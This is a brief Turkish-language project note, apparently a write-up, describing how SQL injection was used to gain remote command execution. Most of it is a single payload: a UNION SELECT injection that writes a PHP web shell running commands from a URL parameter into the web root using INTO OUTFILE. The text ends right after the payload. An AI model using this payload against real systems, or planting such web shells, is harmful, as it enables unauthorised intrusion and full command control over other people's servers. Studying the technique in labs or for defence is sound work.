# SQL Injection to RCE Pipeline

## 🎯 Giriş ve Hedef
Bu projede SQL Injection kullanılarak sistemde komut çalıştırma (RCE) elde edilmiştir.

## 💉 Payload
```sql
?id=-1' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3 
INTO OUTFILE '/var/www/html/kabuk.php'-- -
